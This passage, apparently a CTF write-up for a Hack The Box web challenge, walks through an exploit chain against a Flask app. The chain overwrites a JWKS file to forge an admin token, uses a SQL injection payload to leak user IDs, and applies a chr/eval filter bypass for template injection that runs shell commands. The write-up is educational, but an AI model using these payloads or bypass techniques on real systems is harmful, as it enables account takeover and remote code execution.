+</span></span><span style="display:flex;"><span>b64u <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> i, l: base64<span style="color:#f92672">.</span>urlsafe_b64encode(i<span style="color:#f92672">.</span>to_bytes(l, <span style="color:#e6db74">&#34;big&#34;</span>))<span style="color:#f92672">.</span>rstrip(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;=&#34;</span>)<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>jwks <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;keys&#34;</span>: [{
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;kty&#34;</span>: <span style="color:#e6db74">&#34;RSA&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;use&#34;</span>: <span style="color:#e6db74">&#34;sig&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;alg&#34;</span>: <span style="color:#e6db74">&#34;RS256&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;kid&#34;</span>: <span style="color:#e6db74">&#34;key-1&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;n&#34;</span>: b64u(n, (n<span style="color:#f92672">.</span>bit_length() <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span>) <span style="color:#f92672">//</span> <span style="color:#ae81ff">8</span>),
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;e&#34;</span>: b64u(e, <span style="color:#ae81ff">3</span>),
+</span></span><span style="display:flex;"><span>    }]
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>print(json<span style="color:#f92672">.</span>dumps(jwks, indent<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>))</span></span></code></pre></div><figure><img src="/assets/bobbys-bistro/jwks-py.png">
+</figure>
+
+<p>Using the identified arbitrary file write, it is possible to replace the original jwks.json with this modified version.</p>
+<figure><img src="/assets/bobbys-bistro/afw-req.png">
+</figure>
+
+<figure><img src="/assets/bobbys-bistro/mod-jwks.png">
+</figure>
+
+<p>It has now become possible to sign a token using our private key; the challenge now lies in finding a useful claim, specifically, a valid user ID, since the only one we have access to is that of the user themselves.</p>
+<h2 id="sql-injection">SQL Injection<a class="anchor" href="#sql-injection" aria-label="Link"></a></h2>
+<p>With the goal of obtaining information regarding other users&rsquo; IDs, the candidates for analysis are routes that interact directly with user data, as any vulnerabilities discovered could lead to the leakage of such information.</p>
+<p>The current candidates for this phase are the chat-messages and profile routes, as they satisfy the requirement of interacting with user data, given that the chat-message route, when returning message responses, includes the username of the person who posted the message.</p>
+<p>The profile route returns the user ID, which makes it an interesting target for attempting to retrieve the admin&rsquo;s ID.</p>
+<figure><img src="/assets/bobbys-bistro/profile-page.png">
+</figure>
+
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/profile&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;POST&#34;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@chameleon_flask.template</span>(<span style="color:#e6db74">&#34;profile.pt&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">profile</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;GET&#34;</span>:
+</span></span><span style="display:flex;"><span>        cookie <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;auth_token&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> cookie:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#34;login&#34;</span>))
+</span></span><span style="display:flex;"><span>        decoded <span style="color:#f92672">=</span> verify_token(cookie)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> decoded:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#34;login&#34;</span>))
+</span></span><span style="display:flex;"><span>        uid <span style="color:#f92672">=</span> decoded[<span style="color:#e6db74">&#34;user_id&#34;</span>]
+</span></span><span style="display:flex;"><span>        user <span style="color:#f92672">=</span> User<span style="color:#f92672">.</span>query<span style="color:#f92672">.</span>filter_by(id<span style="color:#f92672">=</span>uid)<span style="color:#f92672">.</span>first()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> user:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#34;register&#34;</span>))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#34;user_data&#34;</span>: [], <span style="color:#e6db74">&#34;token&#34;</span>: user<span style="color:#f92672">.</span>token}
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;POST&#34;</span>:
+</span></span><span style="display:flex;"><span>        cookie <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;auth_token&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> cookie:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#34;login&#34;</span>))
+</span></span><span style="display:flex;"><span>        decoded <span style="color:#f92672">=</span> verify_token(cookie)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> decoded:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#34;login&#34;</span>))
+</span></span><span style="display:flex;"><span>        uid <span style="color:#f92672">=</span> decoded[<span style="color:#e6db74">&#34;user_id&#34;</span>]
+</span></span><span style="display:flex;"><span>        user <span style="color:#f92672">=</span> User<span style="color:#f92672">.</span>query<span style="color:#f92672">.</span>filter_by(id<span style="color:#f92672">=</span>uid)<span style="color:#f92672">.</span>first()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> user:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#34;register&#34;</span>))
+</span></span><span style="display:flex;"><span>        token <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;token&#34;</span>)
+</span></span><span style="display:flex;"><span>        user_data <span style="color:#f92672">=</span> (
+</span></span><span style="display:flex;"><span>            db<span style="color:#f92672">.</span>session<span style="color:#f92672">.</span>query(User)<span style="color:#f92672">.</span>filter(text(<span style="color:#e6db74">&#34;token=&#39;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#39;&#34;</span><span style="color:#f92672">.</span>format(token)))<span style="color:#f92672">.</span>all()
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>        print(user_data)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#34;user_data&#34;</span>: user_data, <span style="color:#e6db74">&#34;token&#34;</span>: user<span style="color:#f92672">.</span>token}</span></span></code></pre></div><p>Analyzing the POST method for this route, one can observe the following issue: <code>user_data = ( db.session.query(User).filter(text(&quot;token='{}'&quot;.format(token))).all())</code></p>
+<p>Even though SQLAlchemy is used as an ORM, the system employs a user-controlled parameter to construct the query text, rather than utilizing the ORM&rsquo;s functions to build the query in a secure manner. Consequently, a sink for SQL injection was identified.</p>
+<p>By exploiting this vector, it is possible to exfiltrate the IDs of all users in the database, including the admin&rsquo;s, using the payload <code>token='OR 1=1 -- -</code></p>
+<figure><img src="/assets/bobbys-bistro/sqli-req.png">
+</figure>
+
+<p>With this, the claim needed to generate the admin&rsquo;s self-signed JWT was obtained, making it possible to impersonate the administrative session.</p>
+<h2 id="admins-session">Admin&rsquo;s session<a class="anchor" href="#admins-session" aria-label="Link"></a></h2>
+<p>Using the two identified attack vectors, it is possible to:</p>
+<ol>
+<li>Obtain the admin ID via SQL injection.</li>
+<li>Replace the <code>jwks.json</code> file with a modified version containing our own key data.</li>
+<li>Create a JWT signed with the private key, including the admin ID as a claim, thereby achieving privilege escalation.</li>
+</ol>
+<p>Steps 1 and 2 have already been completed in previous sessions; to finish step 3, you must first import the data from the generated RSA key:</p>
+<figure><img src="/assets/bobbys-bistro/import-key.png">
+</figure>
+
+<p>Replace the user_id from the original token with the administrator&rsquo;s user_id and sign the token using our key:</p>
+<figure><img src="/assets/bobbys-bistro/sign-token.png">
+</figure>
+
+<p>With the signed token, it is possible to replace the cookie stored in the browser with this token and assume an administrator session.</p>
+<figure><img src="/assets/bobbys-bistro/admin-profile.png">
+</figure>
+
+<p>With this session, privileged routes become available, specifically the <code>/admin/announcements</code> route, which serves as an interface for interacting with the (privileged) POST method of the <code>/api/announcements</code> route.</p>
+<h2 id="ssti-to-rce">SSTI to RCE<a class="anchor" href="#ssti-to-rce" aria-label="Link"></a></h2>
+<figure><img src="/assets/bobbys-bistro/page-adm-an.png">
+</figure>
+
+<p>The <code>/admin/announcements</code> page contains a form that submits data to the <code>/api/announcements</code> route, which has this handler:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/api/announcements&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;POST&#34;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">announcements</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;GET&#34;</span>:
+</span></span><span style="display:flex;"><span>        cookie <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;auth_token&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> cookie:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#e6db74">&#34;unauthorized&#34;</span>}), <span style="color:#ae81ff">401</span>
+</span></span><span style="display:flex;"><span>        dictionary <span style="color:#f92672">=</span> verify_token(cookie)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> dictionary:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#e6db74">&#34;unauthorized&#34;</span>}), <span style="color:#ae81ff">401</span>
+</span></span><span style="display:flex;"><span>        user_id <span style="color:#f92672">=</span> dictionary[<span style="color:#e6db74">&#34;user_id&#34;</span>]
+</span></span><span style="display:flex;"><span>        user <span style="color:#f92672">=</span> User<span style="color:#f92672">.</span>query<span style="color:#f92672">.</span>filter_by(id<span style="color:#f92672">=</span>user_id)<span style="color:#f92672">.</span>first()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> user:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#e6db74">&#34;unauthorized&#34;</span>}), <span style="color:#ae81ff">401</span>
+</span></span><span style="display:flex;"><span>        announcements_array <span style="color:#f92672">=</span> Announcement<span style="color:#f92672">.</span>query<span style="color:#f92672">.</span>filter_by(
+</span></span><span style="display:flex;"><span>            receiver<span style="color:#f92672">=</span>user<span style="color:#f92672">.</span>username
+</span></span><span style="display:flex;"><span>        )<span style="color:#f92672">.</span>first()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> user<span style="color:#f92672">.</span>username <span style="color:#f92672">==</span> admin_username:
+</span></span><span style="display:flex;"><span>            announcements_array <span style="color:#f92672">=</span> Announcement<span style="color:#f92672">.</span>query<span style="color:#f92672">.</span>filter_by(sender<span style="color:#f92672">=</span>user<span style="color:#f92672">.</span>username)
+</span></span><span style="display:flex;"><span>        json_array <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> announcements_array:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> announcements_array:
+</span></span><span style="display:flex;"><span>                json_array<span style="color:#f92672">.</span>append([i<span style="color:#f92672">.</span>id, i<span style="color:#f92672">.</span>timestamp, i<span style="color:#f92672">.</span>sender, i<span style="color:#f92672">.</span>receiver])
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> jsonify(json_array), <span style="color:#ae81ff">200</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;POST&#34;</span>:
+</span></span><span style="display:flex;"><span>        cookie <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;auth_token&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> cookie:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#e6db74">&#34;unauthorized&#34;</span>}), <span style="color:#ae81ff">401</span>
+</span></span><span style="display:flex;"><span>        dictionary <span style="color:#f92672">=</span> verify_token(cookie)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> dictionary:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#e6db74">&#34;unauthorized&#34;</span>}), <span style="color:#ae81ff">401</span>
+</span></span><span style="display:flex;"><span>        user_id <span style="color:#f92672">=</span> dictionary[<span style="color:#e6db74">&#34;user_id&#34;</span>]
+</span></span><span style="display:flex;"><span>        user <span style="color:#f92672">=</span> User<span style="color:#f92672">.</span>query<span style="color:#f92672">.</span>filter_by(id<span style="color:#f92672">=</span>user_id)<span style="color:#f92672">.</span>first()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> user <span style="color:#f92672">or</span> user<span style="color:#f92672">.</span>username <span style="color:#f92672">!=</span> admin_username:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#e6db74">&#34;unauthorized&#34;</span>}), <span style="color:#ae81ff">401</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        title <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;title&#34;</span>)
+</span></span><span style="display:flex;"><span>        content <span style="color:#f92672">=</span> markdown<span style="color:#f92672">.</span>markdown(request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;announcement&#34;</span>))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> content:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> <span style="color:#e6db74">&#39;$#</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;_.&#39;</span>:
+</span></span><span style="display:flex;"><span>                content <span style="color:#f92672">=</span> content<span style="color:#f92672">.</span>replace(i, <span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>        tpl <span style="color:#f92672">=</span> PageTemplate(content)
+</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> tpl<span style="color:#f92672">.</span>render()
+</span></span><span style="display:flex;"><span>        users <span style="color:#f92672">=</span> User<span style="color:#f92672">.</span>query<span style="color:#f92672">.</span>all()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> users:
+</span></span><span style="display:flex;"><span>            new_announcement <span style="color:#f92672">=</span> Announcement(
+</span></span><span style="display:flex;"><span>                timestamp<span style="color:#f92672">=</span>str(datetime<span style="color:#f92672">.</span>now()),
+</span></span><span style="display:flex;"><span>                sender<span style="color:#f92672">=</span>user<span style="color:#f92672">.</span>username,
+</span></span><span style="display:flex;"><span>                content<span style="color:#f92672">=</span>res,
+</span></span><span style="display:flex;"><span>                title<span style="color:#f92672">=</span>title,
+</span></span><span style="display:flex;"><span>                receiver<span style="color:#f92672">=</span>i<span style="color:#f92672">.</span>username,
+</span></span><span style="display:flex;"><span>            )
+</span></span><span style="display:flex;"><span>            db<span style="color:#f92672">.</span>session<span style="color:#f92672">.</span>add(new_announcement)
+</span></span><span style="display:flex;"><span>        db<span style="color:#f92672">.</span>session<span style="color:#f92672">.</span>commit()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;success&#34;</span>: <span style="color:#66d9ef">True</span>}), <span style="color:#ae81ff">200</span></span></span></code></pre></div><p>The most interesting part is that this route reads the value of the <code>announcement</code> parameter and renders a template using that data. This sink allows for the creation of a malicious template that executes Python code, leading to RCE (Remote Code Execution). However, before the template is created, a validation step takes place in which the control characters <code>$#{}&quot;_.</code> are removed.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> content:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> <span style="color:#e6db74">&#39;$#</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;_.&#39;</span>:
+</span></span><span style="display:flex;"><span>      content <span style="color:#f92672">=</span> content<span style="color:#f92672">.</span>replace(i, <span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>  tpl <span style="color:#f92672">=</span> PageTemplate(content)
+</span></span><span style="display:flex;"><span>  res <span style="color:#f92672">=</span> tpl<span style="color:#f92672">.</span>render()</span></span></code></pre></div><p>As a result, common payloads like ${7*7} end up not working due to the validation.</p>
+<figure><img src="/assets/bobbys-bistro/ssti-test-input.png">
+</figure>
+
+<figure><img src="/assets/bobbys-bistro/ssti-test-result.png">
+</figure>
+
+<p>By reading the template library documentation, you can identify other ways to write Python code that will be executed: <a href="https://mkennedy.codes/docs/chameleon-flask/user-guide/writing-templates.html#content-and-replacement-talcontent-and-talreplace">https://mkennedy.codes/docs/chameleon-flask/user-guide/writing-templates.html#content-and-replacement-talcontent-and-talreplace</a></p>
+<p>The <code>tal:content</code> and <code>tal:define</code> tags seem the most interesting for this purpose.</p>
+<figure><img src="/assets/bobbys-bistro/tal-content-input.png">
+</figure>
+
+<figure><img src="/assets/bobbys-bistro/tal-content-result.png">
+</figure>
+
+<p>This proves that it is possible to execute Python code. The current issue is that the <code>mro</code> technique for executing arbitrary Python code relies on a syntax that includes <code>.</code> and <code>_</code> characters, which are flagged during the validation stage for this route.</p>
+<p>Here you can see some bypass techniques for character validation in SSTI attacks: <a href="https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.html#filter-bypasses">https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.html#filter-bypasses</a></p>
+<p>This article demonstrates the use of Python&rsquo;s <code>chr</code> function to construct dynamic strings, which can be quite useful for this bypass: <a href="https://www.yeswehack.com/fr/learn-bug-bounty/server-side-template-injection-exploitation">https://www.yeswehack.com/fr/learn-bug-bounty/server-side-template-injection-exploitation</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> cmd
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">PayloadGenerator</span>(cmd<span style="color:#f92672">.</span>Cmd):
+</span></span><span style="display:flex;"><span>    prompt <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;cmd&gt; &#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">default</span>(self, line):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> line<span style="color:#f92672">.</span>lower() <span style="color:#f92672">in</span> [<span style="color:#e6db74">&#39;exit&#39;</span>, <span style="color:#e6db74">&#39;quit&#39;</span>, <span style="color:#e6db74">&#39;q&#39;</span>]:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Converte o texto para a string formatada</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;+&#34;</span><span style="color:#f92672">.</span>join([<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;chr(</span><span style="color:#e6db74">{</span>ord(c)<span style="color:#e6db74">}</span><span style="color:#e6db74">)&#34;</span> <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> line])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[Payload Gerado]:&#34;</span>)
+</span></span><span style="display:flex;"><span>        print(payload)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;-&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">30</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    PayloadGenerator()<span style="color:#f92672">.</span>cmdloop()</span></span></code></pre></div><p>This Python script converts strings provided via input into sequences of <code>chr</code> calls, serving as a utility to help create payloads using the aforementioned technique.</p>
+<figure><img src="/assets/bobbys-bistro/chr-script.png">
+</figure>
+
+<p>The problem is that by using this generated chain of <code>chr</code> values, the result is the string <code>7*7</code> rather than the execution of the code, since the functions return the strings <code>7</code>, <code>*</code>, and <code>7</code>.</p>
+<figure><img src="/assets/bobbys-bistro/string-chr-input.png">
+</figure>
+
+<figure><img src="/assets/bobbys-bistro/string-chr-result.png">
+</figure>
+
+<p>However, the solution is simple: place everything inside an <code>eval</code>, which will interpret the string as Python code.</p>
+<figure><img src="/assets/bobbys-bistro/eval-input.png">
+</figure>
+
+<figure><img src="/assets/bobbys-bistro/eval-result.png">
+</figure>
+
+<p>In this context, everything necessary to execute Python code within an <code>eval</code> statement—by leveraging a <code>chr</code> bypass—is already available. The script can be used to generate the code <code>__import__('os').popen('cat /flag*').read()</code> and read the flag.</p>
+<figure><img src="/assets/bobbys-bistro/generate-payload.png">
+</figure>
+
+<figure><img src="/assets/bobbys-bistro/payload-input.png">
+</figure>
+
+<figure><img src="/assets/bobbys-bistro/payload-result.png">
+</figure>
+
+<h2 id="exploit-chain">Exploit Chain<a class="anchor" href="#exploit-chain" aria-label="Link"></a></h2>
+<p>The exploit chain is already established for obtaining the flag:</p>
+<ol>
+<li>Retrieve the <code>user_id</code> via SQL Injection;</li>
+<li>Overwrite <code>jwks.json</code> to enable the forging of a token signature containing the administrator&rsquo;s <code>user_id</code>;</li>
+<li>Achieve RCE via SSTI, using an <code>eval</code> + <code>chr</code> bypass.</li>
+</ol>
+<p>Applying this in production:</p>
+<p>Exfiltrating the admin&rsquo;s <code>user_id</code>.</p>
+<figure><img src="/assets/bobbys-bistro/prod-sqli.png">
+</figure>
+
+<p>Overwriting <code>jwks.json</code>
+<figure><img src="/assets/bobbys-bistro/prod-overwrite.png">
+</figure>
+</p>
+<p>Signing a token with the administrator&rsquo;s <code>user id</code>.
+<figure><img src="/assets/bobbys-bistro/prod-sign-token.png">
+</figure>
+</p>
+<p>Accessing the <code>announcement</code> creation screen.
+<figure><img src="/assets/bobbys-bistro/prod-adm-an.png">
+</figure>
+</p>
+<p>SSTI payload.
+<figure><img src="/assets/bobbys-bistro/prod-ssti-input.png">
+</figure>
+</p>
+<p>Reading the flag.
+<figure><img src="/assets/bobbys-bistro/prod-ssti-result.png">
+</figure>
+</p>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+<div>
+
+</div>
+
+<div>
+
+</div>
+
+</div>
+
+<div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/docs/" class="flex align-center">
+        <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#backward"></use></svg>
+        <span>Docs</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/docs/ctf/hack-the-box/challenges-web/breaking-grad/" class="flex align-center">
+        <span>Breaking Grad</span>
+        <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#forward"></use></svg>
+      </a>
+    
+    </span>
+  </div>
+
+ 
+        
+  
+ 
+        
+        
+  
+ 
+        
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
+
+      <label for="menu-control" class="hidden book-menu-overlay" aria-hidden="true"></label>
+    </main>
+
+    
+  
+  <aside class="book-toc" aria-label="Table of Contents">
+    <div class="book-toc-content">
+      
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#setup-test-environment">Setup test environment</a></li>
+    <li><a href="#taint-analisys">Taint Analisys</a></li>
+    <li><a href="#file-upload--arbitrary-file-write">File Upload + Arbitrary File Write</a>
+      <ul>
+        <li><a href="#jwks-poisoning">JWKS Poisoning</a></li>
+      </ul>
+    </li>
+    <li><a href="#sql-injection">SQL Injection</a></li>
+    <li><a href="#admins-session">Admin&rsquo;s session</a></li>
+    <li><a href="#ssti-to-rce">SSTI to RCE</a></li>
+    <li><a href="#exploit-chain">Exploit Chain</a></li>
+  </ul>
+</nav>
+
+
+
+
+
+
+
+    </div>
+  </aside>
+  
+ 
+  </div>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
